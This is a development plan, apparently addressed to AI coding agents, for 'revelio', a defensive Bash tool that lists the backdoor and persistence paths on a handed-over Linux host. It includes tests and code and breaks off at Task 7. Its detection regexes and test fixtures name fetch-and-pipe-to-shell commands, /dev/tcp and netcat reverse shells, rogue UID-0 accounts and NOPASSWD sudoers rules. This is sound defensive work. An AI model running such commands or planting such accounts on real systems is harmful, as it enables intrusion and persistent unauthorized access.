# Homenum Revelio Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build `revelio` — a single, readable, zero-dependency Bash tool that prints a complete, plain-language inventory of every standing-access path a previous owner could retain on a handed-over host, distinguishing package-owned (distro-normal) artifacts from human-placed ones, without ever asserting "SAFE", making a network call, or writing to disk (except `--save`).

**Architecture:** One self-contained, *sourceable* Bash script (`revelio`). A small core — CLI parsing, colour/TTY, an `emit()` classifier that buffers structured findings into two tiers, a `pkg_owns()` provenance helper backed by the system package DB, a `REVELIO_ROOT` read-prefix, overridable command wrappers, and blind-spot accounting — followed by seven independent `check_*` functions, one per access category, each routing findings through `emit()`. The file guards its main block so the support state-diff can `source` it and call individual checks.

**Tech Stack:** Bash 4+ (the shipped tool, zero runtime deps). Dev-only: [bats-core](https://github.com/bats-core/bats-core) for tests, podman for integration fixtures. Targets RPM (Fedora) and dpkg (Debian/Ubuntu) primarily; degrades honestly elsewhere.

**Conventions:**
- Findings are records in the global array `_ITEMS`, fields separated by `$'\x1f'` (unit sep); embedded newlines in the detail field are packed as `$'\x1e'` (record sep) so each record is one line for `read`-splitting, and unpacked at render.
- Tiers: `attention` (human-placed / unattributable — always shown) and `normal` (package-owned — collapsed unless `-v`).
- `pkg_owns` returns `0` owned, `1` not owned, `2` undeterminable. `2` is treated as `attention` with a provenance notice — never silently downgraded to `normal`.
- Plan location deviates from the skill default to match this repo: spec lives in `docs/specs/`, plans in `docs/plans/`.

## File Structure

| Path | Responsibility |
|---|---|
| `revelio` | The entire shipped tool. Sections: header/globals → CLI → colour → core (`emit`/`blindspot`/`pkg_owns`/wrappers/render) → 7 `check_*` → `revelio_main` → source-guard. |
| `README.md` | Trust pitch ("read me, don't trust me"), usage, exit codes, non-goals, the grep-for-network claim. |
| `LICENSE` | MIT. |
| `release.sh` | Generates `SHA256SUMS` for a release (dev/maintainer only). |
| `test/helpers.bash` | Shared bats helpers: `make_root`, `src`, `reset_state`, `emitted`, wrapper-override scaffolding. |
| `test/unit/*.bats` | Fast unit tests per core component + per check (fixture trees + wrapper overrides, no container). |
| `test/unit/invariants.bats` | The trust invariants: source contains no network primitives; tool performs no writes by default. |
| `test/integration/*.bats` | podman end-to-end on real Fedora + Debian (validates real `pkg_owns`). |
| `test/integration/Dockerfile.fedora`, `Dockerfile.debian` | Minimal images that plant known artifacts and run `revelio`. |
| `docs/specs/2026-06-10-homenum-revelio-design.md` | The approved spec (exists). |
| `.gitignore` | Ignore `SHA256SUMS`, scratch dirs. |

---

## Task 0: Prerequisites & repo scaffold

**Files:**
- Create: `.gitignore`, `LICENSE`
- Verify tooling

- [ ] **Step 1: Verify dev tooling is present**

Run:
```bash
bash --version | head -1   # expect 4.x or 5.x
bats --version || echo "INSTALL: sudo dnf install -y bats"
podman --version || echo "INSTALL: sudo dnf install -y podman"
```
Expected: bash ≥4; if `bats`/`podman` missing, run the printed install command.

- [ ] **Step 2: Create `.gitignore`**

```gitignore
SHA256SUMS
*.tmp
/scratch/
```

- [ ] **Step 3: Create `LICENSE` (MIT)**

```text
MIT License

Copyright (c) 2026 agents-deployed

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

- [ ] **Step 4: `git init` + first commit**

```bash
cd ~/projects/homenum-revelio
git init -q
git add .gitignore LICENSE docs/
git commit -q -m "chore: scaffold homenum-revelio repo + spec"
```

---

## Task 1: Skeleton script — shebang, globals, CLI, source-guard

**Files:**
- Create: `revelio`
- Test: `test/helpers.bash`, `test/unit/cli.bats`

- [ ] **Step 1: Write the test helper**

`test/helpers.bash`:
```bash
# shared bats helpers
REPO_ROOT="$(cd "$(dirname "${BATS_TEST_FILENAME}")/../.." && pwd)"
REVELIO="$REPO_ROOT/revelio"

# build an empty fixture root and point REVELIO_ROOT at it
make_root() {
  ROOT="$(mktemp -d)"
  export REVELIO_ROOT="$ROOT"
  mkdir -p "$ROOT/etc/ssh" "$ROOT/root/.ssh" "$ROOT/home" "$ROOT/etc/cron.d" \
           "$ROOT/etc/pam.d" "$ROOT/etc/profile.d"
}

teardown() { [ -n "${ROOT:-}" ] && rm -rf "$ROOT"; }

# source the tool WITHOUT running main (guard sees BASH_SOURCE != $0)
src() { # shellcheck disable=SC1090
  source "$REVELIO"; }

# reset finding state between calls
reset_state() { _ITEMS=(); _N_ATTENTION=0; _N_NORMAL=0; _BLINDSPOTS=(); }

# did any record of TIER contain SUBSTR (in title or detail)?
emitted() {
  local t="$1" sub="$2" rec tier cat title pd rem
  for rec in "${_ITEMS[@]}"; do
    IFS=$'\x1f' read -r tier cat title pd rem <<<"$rec"
    [ "$tier" = "$t" ] || continue
    case "$title"$'\x1e'"$pd" in *"$sub"*) return 0 ;; esac
  done
  return 1
}
```

- [ ] **Step 2: Write the failing CLI test**

`test/unit/cli.bats`:
```bash
#!/usr/bin/env bats
load ../helpers

@test "--version prints a semver-ish version and exits 0" {
  run bash "$REVELIO" --version
  [ "$status" -eq 0 ]
  [[ "$output" =~ [0-9]+\.[0-9]+ ]]
}

@test "--help prints usage incl. the no-judgement promise and exits 0" {
  run bash "$REVELIO" --help
  [ "$status" -eq 0 ]
  [[ "$output" == *"attention count, not a safety verdict"* ]]
  [[ "$output" == *"--save"* ]]
}

@test "unknown flag exits 1 with an error" {
  run bash "$REVELIO" --bogus
  [ "$status" -eq 1 ]
  [[ "$output" == *"unknown option"* ]]
}
```

- [ ] **Step 3: Run to verify it fails**

Run: `bats test/unit/cli.bats`
Expected: FAIL (`revelio` does not exist yet).

- [ ] **Step 4: Create the skeleton `revelio`**

```bash
#!/usr/bin/env bash
# Homenum Revelio — reveal who else still has access to a host you were handed.
# Read-only. No network. No writes (except --save). Read me before you run me:
#   grep -nE 'curl|wget|/dev/tcp|/dev/udp|nc |ncat|telnet' revelio   # -> nothing
set -u

VERSION="0.1.0"

# ---- globals -----------------------------------------------------------------
REVELIO_ROOT="${REVELIO_ROOT:-}"   # read-prefix; "" means "/". e.g. /mnt for a mounted image
REVELIO_SELF="$0"
VERBOSE=0
USE_COLOR=1
NO_COLOR_FLAG=0
SAVE_FILE=""
THOROUGH=0

_ITEMS=()
_N_ATTENTION=0
_N_NORMAL=0
_BLINDSPOTS=()
_PM=""

# --- detection signatures (data we search FOR — NOT commands this tool runs) ----------
# Trust note: these two lines are the ONLY place network tokens (curl/wget/nc//dev/tcp)
# appear in this file. They are regexes matched against the CONTENTS of OTHER files.
FETCHEXEC_RE='(curl|wget)[^|]*\| *(sh|bash|zsh)|base64 +(-d|--decode)[^|]*\| *(sh|bash)'
REVSHELL_RE='bash -i|sh -i|/dev/tcp/|nc .*-e'

# ---- cli ---------------------------------------------------------------------
usage() {
  cat <<'EOF'
revelio — reveal standing-access paths a previous owner could retain.

USAGE: revelio [options]

OPTIONS:
  -v, --verbose     also list package-owned ("distro-normal") items
      --no-color    disable ANSI colour
      --save FILE   write a plain-text copy of the report to FILE (the only write)
      --thorough    scan all of / for setuid/capabilities (slower)
  -h, --help        this help
      --version     print version

Exit code is an ATTENTION COUNT, not a safety verdict:
  0  nothing needs your eyes      10  items need your eyes      1  tool error

This tool never says "SAFE". It hands you a complete inventory; you decide
which entries you recognise. It makes no network calls and writes nothing
unless you pass --save.
EOF
}

parse_args() {
  while [ $# -gt 0 ]; do
    case "$1" in
      -v|--verbose) VERBOSE=1 ;;
      --no-color)   NO_COLOR_FLAG=1 ;;
      --save)       shift; SAVE_FILE="${1:-}"; [ -n "$SAVE_FILE" ] || { echo "revelio: --save needs a FILE" >&2; exit 1; } ;;
      --thorough)   THOROUGH=1 ;;
      -h|--help)    usage; exit 0 ;;
      --version)    echo "revelio $VERSION"; exit 0 ;;
      *)            echo "revelio: unknown option: $1" >&2; exit 1 ;;
    esac
    shift
  done
}

revelio_main() {
  parse_args "$@"
  echo "revelio $VERSION (skeleton)"   # replaced in Task 2
  return 0
}

# ---- source-guard: run main only when executed, not when sourced ------------
if [ "${BASH_SOURCE[0]}" = "$0" ]; then
  revelio_main "$@"
  exit $?
fi
```

- [ ] **Step 5: Make executable and run the test**

Run: `chmod +x revelio && bats test/unit/cli.bats`
Expected: PASS (3 tests).

- [ ] **Step 6: Commit**

```bash
git add revelio test/helpers.bash test/unit/cli.bats
git commit -q -m "feat: revelio skeleton — CLI parsing, version/help, source-guard"
```

---

## Task 2: Trust invariants — no network, no writes (enforced in CI)

**Files:**
- Test: `test/unit/invariants.bats`

These tests encode the central trust claims as regression-guarded facts, from the very first real code onward.

- [ ] **Step 1: Write the failing invariant tests**

`test/unit/invariants.bats`:
```bash
#!/usr/bin/env bats
load ../helpers

@test "source contains no network primitives" {
  run grep -nE 'curl|wget|/dev/tcp|/dev/udp|(^| )nc( |$)|ncat|telnet|ftp ' "$REVELIO"
  # the only allowed matches are (a) comment lines and (b) the two named signature
  # regexes (FETCHEXEC_RE / REVSHELL_RE) — data the tool searches for, not calls it makes.
  filtered="$(printf '%s\n' "$output" \
    | grep -vE '^\s*[0-9]+:\s*#' \
    | grep -vE 'FETCHEXEC_RE=|REVSHELL_RE=' || true)"
  [ -z "$filtered" ]
}

@test "default run performs no writes outside REVELIO_ROOT" {
  make_root
  # strace the run; assert no openat for write outside the fixture root and /dev,/proc,/sys
  if command -v strace >/dev/null 2>&1; then
    run strace -f -e trace=openat -o "$ROOT/strace.out" bash "$REVELIO" --no-color
    # writes look like O_WRONLY/O_RDWR/O_CREAT
    bad="$(grep -E 'O_WRONLY|O_RDWR|O_CREAT' "$ROOT/strace.out" \
            | grep -vE "$ROOT|/dev/|/proc/|/sys/|pipe:|socket:" || true)"
    [ -z "$bad" ]
  else
    skip "strace not installed"
  fi
}
```

- [ ] **Step 2: Run to verify state**

Run: `bats test/unit/invariants.bats`
Expected: the no-network test PASSES already (skeleton has no network); the no-writes test PASSES or SKIPS. (If it fails because the skeleton echoes only, that's fine — it still performs no writes.)

- [ ] **Step 3: Commit**

```bash
git add test/unit/invariants.bats
git commit -q -m "test: enforce no-network and no-writes trust invariants"
```

---

## Task 3: Output core — colour, emit(), render, exit codes, --save

**Files:**
- Modify: `revelio` (replace the `revelio_main` stub; add colour + emit + render)
- Test: `test/unit/render.bats`

- [ ] **Step 1: Write the failing render tests**

`test/unit/render.bats`:
```bash
#!/usr/bin/env bats
load ../helpers

setup() { src; reset_state; USE_COLOR=0; setup_color; }

@test "emit buffers into tiers and bumps counters" {
  emit attention ssh "rogue key" "comment: deploy@x" "sed -i ..."
  emit normal cron "chrony timer" "owned by chrony" ""
  [ "$_N_ATTENTION" -eq 1 ]
  [ "$_N_NORMAL" -eq 1 ]
}

@test "render shows ATTENTION items always, hides normal without -v" {
  emit attention ssh "rogue key" "comment: deploy@x" "rm it"
  emit normal cron "chrony timer" "owned by chrony" ""
  VERBOSE=0
  out="$(revelio_render)"
  [[ "$out" == *"NEEDS YOUR EYES (1)"* ]]
  [[ "$out" == *"rogue key"* ]]
  [[ "$out" == *"distro-normal (1)"* ]]
  [[ "$out" != *"chrony timer"* ]]
}

@test "render expands normal items with -v" {
  emit normal cron "chrony timer" "owned by chrony" ""
  VERBOSE=1
  out="$(revelio_render)"
  [[ "$out" == *"chrony timer"* ]]
}

@test "render shows remediation and multi-line detail" {
  emit attention cron "hourly curl|sh" $'cmd: curl x | sh\nuser: root' "crontab -r"
  out="$(revelio_render)"
  [[ "$out" == *"cmd: curl x | sh"* ]]
  [[ "$out" == *"user: root"* ]]
  [[ "$out" == *"if not yours: crontab -r"* ]]
}

@test "render lists blind spots when present" {
  blindspot "other users' crontabs (need root)"
  out="$(revelio_render)"
  [[ "$out" == *"COULDN'T CHECK WITHOUT ROOT (1)"* ]]
  [[ "$out" == *"other users' crontabs"* ]]
}
```

- [ ] **Step 2: Run to verify it fails**

Run: `bats test/unit/render.bats`
Expected: FAIL (`setup_color`, `emit`, `revelio_render` not defined).

- [ ] **Step 3: Add the core to `revelio`** (insert before the cli section)

```bash
# ---- colour ------------------------------------------------------------------
setup_color() {
  if [ "$NO_COLOR_FLAG" -eq 1 ] || [ -n "${NO_COLOR:-}" ] || [ ! -t 1 ]; then
    USE_COLOR=0
  fi
  if [ "$USE_COLOR" -eq 1 ]; then
    C_RED=$'\e[31m'; C_YEL=$'\e[33m'; C_DIM=$'\e[2m'; C_BOLD=$'\e[1m'; C_RST=$'\e[0m'
  else
    C_RED=""; C_YEL=""; C_DIM=""; C_BOLD=""; C_RST=""
  fi
}

# ---- finding buffer ----------------------------------------------------------
# emit TIER CATEGORY TITLE DETAIL [REMEDIATION]
emit() {
  local tier="$1" cat="$2" title="$3" detail="${4:-}" rem="${5:-}"
  local pd="${detail//$'\n'/$'\x1e'}"          # pack newlines so the record is one line
  _ITEMS+=("$tier"$'\x1f'"$cat"$'\x1f'"$title"$'\x1f'"$pd"$'\x1f'"$rem")
  case "$tier" in
    attention) _N_ATTENTION=$((_N_ATTENTION + 1)) ;;
    normal)    _N_NORMAL=$((_N_NORMAL + 1)) ;;
  esac
}

blindspot() { _BLINDSPOTS+=("$1"); }

_print_detail() { # indent each line of a (newline-joined) detail block
  local block="$1" pre="$2" l
  [ -n "$block" ] || return 0
  while IFS= read -r l; do printf '      %s%s%s\n' "$pre" "$l" "$C_RST"; done <<<"$block"
}

revelio_render() {
  local rec tier cat title pd rem detail
  printf '%sHomenum Revelio%s — access inventory for %s\n\n' \
         "$C_BOLD" "$C_RST" "${REVELIO_ROOT:-/}"

  printf '%s↑ NEEDS YOUR EYES (%d)%s\n' "$C_RED" "$_N_ATTENTION" "$C_RST"
  [ "$_N_ATTENTION" -eq 0 ] && printf '  (none)\n'
  for rec in "${_ITEMS[@]:-}"; do
    [ -n "$rec" ] || continue
    IFS=$'\x1f' read -r tier cat title pd rem <<<"$rec"
    [ "$tier" = attention ] || continue
    detail="${pd//$'\x1e'/$'\n'}"
    printf '  %s•%s [%s] %s\n' "$C_RED" "$C_RST" "$cat" "$title"
    _print_detail "$detail" ""
    [ -n "$rem" ] && printf '      %s-> if not yours: %s%s\n' "$C_DIM" "$rem" "$C_RST"
  done
  printf '\n'

  if [ "$VERBOSE" -eq 1 ]; then
    printf '%s+ distro-normal (%d)%s\n' "$C_DIM" "$_N_NORMAL" "$C_RST"
    for rec in "${_ITEMS[@]:-}"; do
      [ -n "$rec" ] || continue
      IFS=$'\x1f' read -r tier cat title pd rem <<<"$rec"
      [ "$tier" = normal ] || continue
      detail="${pd//$'\x1e'/$'\n'}"
      printf '  %s+ [%s] %s%s\n' "$C_DIM" "$cat" "$title" "$C_RST"
      _print_detail "$detail" "$C_DIM"
    done
  else
    printf '%s+ distro-normal (%d) — package-owned; show with -v%s\n' \
           "$C_DIM" "$_N_NORMAL" "$C_RST"
  fi
  printf '\n'

  if [ "${#_BLINDSPOTS[@]}" -gt 0 ]; then
    printf "%s! COULDN'T CHECK WITHOUT ROOT (%d)%s\n" "$C_YEL" "${#_BLINDSPOTS[@]}" "$C_RST"
    local b
    for b in "${_BLINDSPOTS[@]}"; do printf '  • %s\n' "$b"; done
    printf '  %sre-run as root to include these: sudo %s%s\n\n' "$C_DIM" "$REVELIO_SELF" "$C_RST"
  fi

  printf 'This is the complete inventory we could read. You decide which you recognise.\n'
}

strip_ansi() { sed -E $'s/\x1b\\[[0-9;]*m//g'; }
```

- [ ] **Step 4: Replace `revelio_main`** with the real driver (checks are wired in later tasks):

```bash
run_all_checks() {
  :  # check_* calls are appended here as each is implemented (Tasks 5-11)
}

revelio_main() {
  parse_args "$@"
  setup_color
  run_all_checks
  local out; out="$(revelio_render)"
  printf '%s\n' "$out"
  if [ -n "$SAVE_FILE" ]; then
    printf '%s\n' "$out" | strip_ansi > "$SAVE_FILE"
  fi
  [ "$_N_ATTENTION" -gt 0 ] && return 10
  return 0
}
```

- [ ] **Step 5: Run tests**

Run: `bats test/unit/render.bats test/unit/cli.bats`
Expected: PASS.

- [ ] **Step 6: Add exit-code + --save tests**

Append to `test/unit/render.bats`:
```bash
@test "exit 0 when nothing needs eyes, 10 when something does" {
  make_root
  run bash "$REVELIO" --no-color
  [ "$status" -eq 0 ]
}

@test "--save writes a colour-free report and nothing else" {
  make_root
  run bash "$REVELIO" --no-color --save "$ROOT/report.txt"
  [ -f "$ROOT/report.txt" ]
  run grep -c $'\x1b' "$ROOT/report.txt"
  [ "$output" -eq 0 ]
}
```

Run: `bats test/unit/render.bats`
Expected: PASS.

- [ ] **Step 7: Commit**

```bash
git add revelio test/unit/render.bats
git commit -q -m "feat: output core — colour, emit() two-tier buffer, render, exit codes, --save"
```

---

## Task 4: Provenance engine — pkg_owns() + detection + degradation

**Files:**
- Modify: `revelio` (add PM detection + `pkg_owns` + wrappers)
- Test: `test/unit/provenance.bats`

- [ ] **Step 1: Write the failing tests**

`test/unit/provenance.bats`:
```bash
#!/usr/bin/env bats
load ../helpers

setup() { src; reset_state; }

@test "pkg_owns returns 2 (undeterminable) when no package manager" {
  _PM=none
  run pkg_owns /etc/anything
  [ "$status" -eq 2 ]
}

@test "classify_provenance: owned -> normal tier" {
  _PM=rpm
  pkg_owns() { return 0; }   # override: pretend owned
  classify_provenance /usr/lib/systemd/system/chrony.service ssh "chrony unit" "ExecStart=..." ""
  emitted normal "chrony unit"
}

@test "classify_provenance: not owned -> attention tier" {
  _PM=rpm
  pkg_owns() { return 1; }   # override: pretend not owned
  classify_provenance /etc/cron.d/evil sched "hand-dropped cron" "curl x | sh" "rm /etc/cron.d/evil"
  emitted attention "hand-dropped cron"
}

@test "classify_provenance: undeterminable -> attention + provenance note" {
  _PM=none
  classify_provenance /etc/cron.d/x sched "unknown-provenance cron" "..." ""
  emitted attention "provenance undeterminable"
}
```

- [ ] **Step 2: Run to verify it fails**

Run: `bats test/unit/provenance.bats`
Expected: FAIL (`pkg_owns`, `classify_provenance` not defined).

- [ ] **Step 3: Add provenance engine + wrappers to `revelio`** (after the finding buffer section)

```bash
# ---- command wrappers (overridable in tests) --------------------------------
revelio_ss()      { ss "$@"; }
revelio_getcap()  { getcap "$@"; }
revelio_ps()      { ps "$@"; }

# ---- provenance --------------------------------------------------------------
revelio_pm_detect() {
  if   command -v rpm    >/dev/null 2>&1; then _PM=rpm
  elif command -v dpkg   >/dev/null 2>&1; then _PM=dpkg
  elif command -v pacman >/dev/null 2>&1; then _PM=pacman
  elif command -v apk    >/dev/null 2>&1; then _PM=apk
  else _PM=none; fi
}

# pkg_owns PATH -> 0 owned, 1 not owned, 2 undeterminable
pkg_owns() {
  local p="$1"
  case "$_PM" in
    rpm)    rpm    -qf     "$p" >/dev/null 2>&1 ;;
    dpkg)   dpkg   -S      "$p" >/dev/null 2>&1 ;;
    pacman) pacman -Qo     "$p" >/dev/null 2>&1 ;;
    apk)    apk    info -W "$p" >/dev/null 2>&1 ;;
    *)      return 2 ;;
  esac
}

# classify_provenance PATH CATEGORY TITLE DETAIL REMEDIATION
# package-owned -> normal; not owned -> attention; undeterminable -> attention+note
classify_provenance() {
  local path="$1" cat="$2" title="$3" detail="$4" rem="${5:-}"
  pkg_owns "$path"
  case $? in
    0) emit normal    "$cat" "$title" "$detail" "$rem" ;;
    1) emit attention "$cat" "$title" "$detail" "$rem" ;;
    2) emit attention "$cat" "$title (provenance undeterminable: no package manager)" "$detail" "$rem" ;;
  esac
}
```

- [ ] **Step 4: Wire detection into main** — add `revelio_pm_detect` after `setup_color` in `revelio_main`:

```bash
  setup_color
  revelio_pm_detect
  run_all_checks
```

- [ ] **Step 5: Run tests**

Run: `bats test/unit/provenance.bats`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add revelio test/unit/provenance.bats
git commit -q -m "feat: provenance engine — pkg_owns + classify_provenance + degradation rule"
```

---

## Task 5: check_ssh — keys + sshd danger knobs

**Files:**
- Modify: `revelio` (add `check_ssh`; call it in `run_all_checks`)
- Test: `test/unit/check_ssh.bats`

- [ ] **Step 1: Write the failing tests**

`test/unit/check_ssh.bats`:
```bash
#!/usr/bin/env bats
load ../helpers
setup() { src; reset_state; make_root; _PM=none; }

@test "surfaces an authorized_keys entry as attention with its comment" {
  echo 'ssh-ed25519 AAAAC3Nz... deploy@laptop' > "$ROOT/root/.ssh/authorized_keys"
  check_ssh
  emitted attention "authorized_keys"
  emitted attention "deploy@laptop"
}

@test "flags PermitRootLogin yes and PasswordAuthentication yes" {
  printf 'PermitRootLogin yes\nPasswordAuthentication yes\n' > "$ROOT/etc/ssh/sshd_config"
  check_ssh
  emitted attention "PermitRootLogin yes"
  emitted attention "PasswordAuthentication yes"
}

@test "flags AuthorizedKeysCommand and TrustedUserCAKeys as access vectors" {
  printf 'AuthorizedKeysCommand /usr/bin/fetchkeys\nTrustedUserCAKeys /etc/ssh/ca.pub\n' \
    > "$ROOT/etc/ssh/sshd_config"
  check_ssh
  emitted attention "AuthorizedKeysCommand"
  emitted attention "TrustedUserCAKeys"
}

@test "no keys, hardened config -> no ssh attention items" {
  printf 'PermitRootLogin no\nPasswordAuthentication no\n' > "$ROOT/etc/ssh/sshd_config"
  check_ssh
  ! emitted attention "authorized_keys"
}
```

- [ ] **Step 2: Run to verify it fails**

Run: `bats test/unit/check_ssh.bats`
Expected: FAIL (`check_ssh` not defined).

- [ ] **Step 3: Implement `check_ssh`** (add to the checks section)

```bash
# enumerate home directories (root + everything under /home) within REVELIO_ROOT
_home_dirs() {
  printf '%s\n' "$REVELIO_ROOT/root"
  local d
  for d in "$REVELIO_ROOT"/home/*; do [ -d "$d" ] && printf '%s\n' "$d"; done
}

check_ssh() {
  local home ak line ftype comment mtime
  # 1) authorized_keys in every home
  while IFS= read -r home; do
    ak="$home/.ssh/authorized_keys"
    [ -f "$ak" ] || continue
    mtime="$(date -r "$ak" '+%Y-%m-%d' 2>/dev/null || echo '?')"
    while IFS= read -r line; do
      [ -n "$line" ] || continue
      case "$line" in \#*) continue ;; esac
      ftype="${line%% *}"
      comment="${line##* }"
      emit attention ssh "SSH key in ${ak#"$REVELIO_ROOT"}" \
        "type: $ftype"$'\n'"comment: $comment"$'\n'"file mtime: $mtime" \
        "edit ${ak#"$REVELIO_ROOT"} and delete the line if you don't recognise it"
    done < "$ak"
  done < <(_home_dirs)

  # 2) sshd_config danger knobs
  local cfg="$REVELIO_ROOT/etc/ssh/sshd_config" key val
  [ -f "$cfg" ] || return 0
  while read -r key val; do
    case "$key" in
      PermitRootLogin)       [ "$val" = yes ] && emit attention ssh "PermitRootLogin yes" "root may log in over SSH" "set 'PermitRootLogin no' in $cfg" ;;
      PasswordAuthentication)[ "$val" = yes ] && emit attention ssh "PasswordAuthentication yes" "password logins allowed (brute-forceable)" "set 'PasswordAuthentication no' in $cfg" ;;
      AuthorizedKeysCommand) emit attention ssh "AuthorizedKeysCommand set" "sshd runs '$val' to fetch keys at login — a remote-key vector" "review/remove this line in $cfg" ;;
      TrustedUserCAKeys)     emit attention ssh "TrustedUserCAKeys set" "cert-based access trusting CA '$val' — anyone with the CA private key can mint a login" "review/remove this line in $cfg" ;;
    esac
  done < <(grep -iE '^[[:space:]]*(PermitRootLogin|PasswordAuthentication|AuthorizedKeysCommand|TrustedUserCAKeys)[[:space:]]' "$cfg" 2>/dev/null)
}
```

- [ ] **Step 4: Wire into `run_all_checks`**

Replace the body of `run_all_checks` with:
```bash
run_all_checks() {
  check_ssh
}
```

- [ ] **Step 5: Run tests**

Run: `bats test/unit/check_ssh.bats`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add revelio test/unit/check_ssh.bats
git commit -q -m "feat: check_ssh — authorized_keys + sshd danger knobs (AuthorizedKeysCommand, TrustedUserCAKeys)"
```

---

## Task 6: check_accounts — users, empty passwords, sudoers, dangerous groups

**Files:**
- Modify: `revelio` (add `check_accounts`; call it)
- Test: `test/unit/check_accounts.bats`

- [ ] **Step 1: Write the failing tests**

`test/unit/check_accounts.bats`:
```bash
#!/usr/bin/env bats
load ../helpers
setup() {
  src; reset_state; make_root; _PM=none
  # minimal passwd/shadow/group fixtures
  cat > "$ROOT/etc/passwd" <<'EOF'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
alice:x:1000:1000:alice:/home/alice:/bin/bash
backdoor:x:0:0:backdoor:/root:/bin/bash
EOF
  cat > "$ROOT/etc/shadow" <<'EOF'
root:$6$abc:19000:0:99999:7:::
alice:$6$xyz:19000:0:99999:7:::
ghost::19000:0:99999:7:::
EOF
  cat > "$ROOT/etc/group" <<'EOF'
wheel:x:10:alice
docker:x:990:alice
sudo:x:27:
EOF
  mkdir -p "$ROOT/etc/sudoers.d"
}

@test "flags a second UID-0 account" {
  check_accounts
  emitted attention "backdoor"
  emitted attention "UID 0"
}

@test "flags an empty-password account" {
  check_accounts
  emitted attention "empty password"
  emitted attention "ghost"
}

@test "flags NOPASSWD sudoers entries" {
  echo 'alice ALL=(ALL) NOPASSWD: ALL' > "$ROOT/etc/sudoers.d/alice"
  check_accounts
  emitted attention "NOPASSWD"
}

@test "flags membership in docker group (root-equivalent)" {
  check_accounts
  emitted attention "docker group"
}
```

- [ ] **Step 2: Run to verify it fails**

Run: `bats test/unit/check_accounts.bats`
Expected: FAIL.

- [ ] **Step 3: Implement `check_accounts`**

```bash
check_accounts() {
  local passwd="$REVELIO_ROOT/etc/passwd"
  local shadow="$REVELIO_ROOT/etc/shadow"
  local group="$REVELIO_ROOT/etc/group"
  local name pw uid gid gecos home shell

  # 1) accounts: extra UID-0, human accounts with login shells
  if [ -f "$passwd" ]; then
    while IFS=: read -r name pw uid gid gecos home shell; do
      [ -n "$name" ] || continue
      if [ "$uid" = 0 ] && [ "$name" != root ]; then
        emit attention accounts "Second UID 0 account: $name" \
          "uid: 0 (root-equivalent)"$'\n'"home: $home"$'\n'"shell: $shell" \
          "userdel $name   # if you didn't create it"
      fi
    done < "$passwd"
  fi

  # 2) empty-password accounts (shadow field 2 empty)
  if [ -r "$shadow" ]; then
    while IFS=: read -r name pw _; do
      [ -n "$name" ] || continue
      if [ -z "$pw" ]; then
        emit attention accounts "Account with empty password: $name" \
          "this account can log in with no password" "passwd -l $name   # lock it"
      fi
    done < "$shadow"
  else
    [ -f "$shadow" ] || blindspot "/etc/shadow (need root to read empty-password accounts)"
  fi

  # 3) sudoers NOPASSWD
  local f
  for f in "$REVELIO_ROOT/etc/sudoers" "$REVELIO_ROOT"/etc/sudoers.d/*; do
    [ -f "$f" ] || continue
    if grep -qiE 'NOPASSWD' "$f" 2>/dev/null; then
      emit attention accounts "NOPASSWD sudoers rule in ${f#"$REVELIO_ROOT"}" \
        "$(grep -iE 'NOPASSWD' "$f")" "review ${f#"$REVELIO_ROOT"} with visudo"
    fi
  done

  # 4) dangerous group membership (docker == root-equivalent; wheel/sudo == admin)
  if [ -f "$group" ]; then
    local gname gpw ggid members
    while IFS=: read -r gname gpw ggid members; do
      [ -n "$members" ] || continue
      case "$gname" in
        docker) emit attention accounts "Members of docker group: $members" \
                  "docker group membership is root-equivalent" "gpasswd -d <user> docker   # if unexpected" ;;
        wheel|sudo) emit normal accounts "Members of $gname group: $members" "admin group membership" "" ;;
      esac
    done < "$group"
  fi
}
```

- [ ] **Step 4: Wire in** — add `check_accounts` to `run_all_checks`.

- [ ] **Step 5: Run tests**

Run: `bats test/unit/check_accounts.bats`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add revelio test/unit/check_accounts.bats
git commit -q -m "feat: check_accounts — extra UID-0, empty passwords, NOPASSWD sudoers, docker group"
```

---

## Task 7: check_listening — listening sockets → process → package owner

**Files:**
- Modify: `revelio` (add `check_listening`; call it)
- Test: `test/unit/check_listening.bats`

This check reads live state via `revelio_ss`; tests override the wrapper with fixture output.

- [ ] **Step 1: Write the failing tests**

`test/unit/check_listening.bats`:
```bash
#!/usr/bin/env bats
load ../helpers
setup() { src; reset_state; _PM=rpm; }

# ss -tlnpH / -ulnpH style lines: State Recv-Q Send-Q Local Peer Process
ss_fixture() {
cat <<'EOF'
LISTEN 0 128 0.0.0.0:22   0.0.0.0:* users:(("sshd",pid=800,fd=3))
LISTEN 0 128 0.0.0.0:4444 0.0.0.0:* users:(("nc",pid=1313,fd=4))
EOF
}

@test "package-owned listener (sshd) is normal; unowned (nc backdoor) is attention" {
  revelio_ss() { ss_fixture; }
  pkg_owns() { case "$1" in */sshd) return 0;; *) return 1;; esac; }
  # resolve binary path from process name for the test
  _resolve_bin() { case "$1" in sshd) echo /usr/sbin/sshd;; nc) echo /usr/bin/nc;; *) echo "";; esac; }
  check_listening
  emitted normal "sshd"
  emitted attention "4444"
  emitted attention "nc"
}
```

- [ ] **Step 2: Run to verify it fails**

Run: `bats test/unit/check_listening.bats`
Expected: FAIL.

- [ ] **Step 3: Implement `check_listening`** (and a default `_resolve_bin`)

```bash
